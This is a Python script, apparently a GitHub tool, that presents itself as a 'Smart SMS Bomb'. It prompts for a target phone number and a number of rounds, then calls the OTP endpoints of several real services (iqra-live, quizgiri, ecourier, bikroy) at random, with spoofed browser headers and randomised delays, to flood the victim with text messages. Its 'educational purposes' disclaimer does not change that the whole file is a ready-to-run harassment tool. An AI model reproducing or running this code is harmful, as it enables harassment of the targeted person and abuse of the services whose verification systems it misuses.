 Logo 

import os 
import sys 
import time


os.system("clear")

print("\n\n\n\n")

ab="           \033[1;33mSystem loding...."

for c in ab:
	sys.stdout.write(c)
	sys.stdout.flush()
	time.sleep(0.1)

print("\n\n\n\n")


os.system("clear")

time.sleep(2)
print("\n\n")

ab="         \033[1;32mSuccessfully Loaded.!\n"

for c in ab:
	sys.stdout.write(c)
	sys.stdout.flush()
	time.sleep(0.1)
name=input("         \033[1;34mName:")

ab="         \033[1;31mHey "+name+", Be Ethical.."

for c in ab:
	sys.stdout.write(c)
	sys.stdout.flush()
	time.sleep(0.1)

print("\n\n")


time.sleep(2)

os.system("clear")

print(""" \033[1;31m


   _____  .__                 
  /  _  \\ |  | _____  ___  ___
 /  /_\\  \\|  | \\__  \\ \\  \\/  /
/    |    \\  |__/ __ \\_>    < 
\\____|__  /____(____  /__/\\_ \\
        \\/          \\/      \\/
        

\033[1;33m===================================================
\033[1;32m Tools Name: Smart SMS Bomb
 Owner: Alax Mahmud
 Github: dabblesquard
 Use this tools only for educational purposes
\033[1;33m===================================================\033[0m
""")

print("""\033[1;32m===================================================\n""")


print("\033[1;31m\033[1m\tPowerful Bombing Tools\033[0m\n")

ab= "\033[1m \033[1;33mMake sure internet connection to use this tools\n\033[0m\n"

for c in ab:
	sys.stdout.write(c)
	sys.stdout.flush()
	time.sleep(0.1)

print("""\033[1;32m===================================================\n""")



import requests
import time
import random
import os

# === Colors ===
GREEN = "\033[1;32m"
RED = "\033[1;31m"
CYAN = "\033[1;36m"
YELLOW = "\033[1;33m"
RESET = "\033[0m"

# === Result Tracker ===
success = 0
failed = 0
total = 0

# === Utility Logger ===
def log(status, msg):
    if status == "success":
        print(f"{GREEN}[SUCCESS]{RESET} {msg}")
    elif status == "fail":
        print(f"{RED}[FAILED]{RESET} {msg}")
    else:
        print(f"{CYAN}[INFO]{RESET} {msg}")

# === API Functions ===
def send_iqra_simple(phone):
    global success, failed, total
    url = f"https://apibeta.iqra-live.com/api/v2/sent-otp/{phone}"
    try:
        r = requests.get(url)
        total += 1
        if r.status_code == 200:
            success += 1
            log("success", " SMS Sent")
        else:
            failed += 1
            log("fail", f"SMS Sent Failed ")
    except Exception as e:
        failed += 1
        log("fail", f"IQRA-1 Error: {e}")

def send_quizgiri(phone):
    global success, failed, total
    url = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
    data = {"phone": phone, "fcm_token": None}
    try:
        r = requests.post(url, json=data)
        total += 1
        if r.status_code == 200:
            success += 1
            log("success", " SMS Sent")
        else:
            failed += 1
            log("fail", f"Sms sent Failed")
    except Exception as e:
        failed += 1
        log("fail", f"QuizGiri Error: {e}")

def send_ecourier_post(phone):
    global success, failed, total
    url = "https://backoffice.ecourier.com.bd/api/web/individual-send-otp"
    data = {"phone": phone}
    try:
        r = requests.post(url, json=data)
        total += 1
        if r.status_code == 200:
            success += 1
            log("success", " SMS Sent")
        else:
            failed += 1
            log("fail", f"Sms Sent Failed")
    except Exception as e:
        failed += 1
        log("fail", f"eCourier-POST Error: {e}")

def send_bikroy(phone):
    global success, failed, total
    headers = {
        'authority': 'bikroy.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'bn',
        'application-name': 'web',
        'referer': 'https://bikroy.com/bn/users/login',
        'user-agent': 'Mozilla/5.0 (Linux; Android 14)',
    }
    params = {'phone': phone}
    try:
        r = requests.get('https://bikroy.com/data/phone_number_login/verifications/phone_login',
                         params=params, headers=headers)
        total += 1
        if r.status_code == 200:
            success += 1
            log("success", "SMS Sent")
        else:
            failed += 1
            log("fail", f"Sms sent Failed")
    except Exception as e:
        failed += 1
        log("fail", f"Bikroy Error: {e}")

def send_ecourier_get(phone):
    global success, failed, total
    url = 'https://backoffice.ecourier.com.bd/api/web/individual-send-otp'
    headers = {
        'Accept': '*/*',
        'User-Agent': 'Mozilla/5.0',
        'Origin': 'https://ecourier.com.bd',
        'Referer': 'https://ecourier.com.bd/',
    }
    params = {'mobile': phone}
    try:
        r = requests.get(url, params=params, headers=headers)
        total += 1
        if r.status_code == 200:
            success += 1
            log("success", f"SMS Sent ")
        else:
            failed += 1
            log("fail", f"Sms sent Failed")
    except Exception as e:
        failed += 1
        log("fail", f"eCourier-GET Error: {e}")

def send_iqra_headers(phone):
    global success, failed, total
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Origin': 'https://iqra-live.com',
        'Referer': 'https://iqra-live.com/',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
    }
    url = f'https://apibeta.iqra-live.com/api/v2/sent-otp/{phone}'
    try:
        r = requests.get(url, headers=headers)
        total += 1
        if r.status_code == 200:
            success += 1
            log("success", "SMS Sent")
        else:
            failed += 1
            log("fail", f"Sms sent Failed")
    except Exception as e:
        failed += 1
        log("fail", f"IQRA-2 Error: {e}")

# === All APIs in list ===
api_list = [
    send_iqra_simple,
    send_quizgiri,
    send_ecourier_post,
    send_bikroy,
    send_ecourier_get,
    send_iqra_headers
]

# === Main Program ===
def main():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""{CYAN}
    =====================================
         Powerful SMS Bombing Tool
    =====================================
    {RESET}""")

    phone = input(f"{YELLOW}Enter Target Number: {RESET}")
    amount = int(input(f"{YELLOW}Enter Amount: {RESET}"))

    log("info", f"Starting SMS flood to {phone} for {amount} rounds...")
    
    for i in range(amount):
        api = random.choice(api_list)   # Randomize API calls
        api(phone)
        delay= random.randint(5, 20)
        log("info", f"Waiting {delay} seconds before next request...")
        time.sleep(delay)

    print(f"""\n{CYAN}========== SUMMARY =========={RESET}
    Total Attempts : {total}
    {GREEN}Successful     : {success}{RESET}
    {RED}Failed         : {failed}{RESET}
    """)

if __name__ == "__main__":
    main()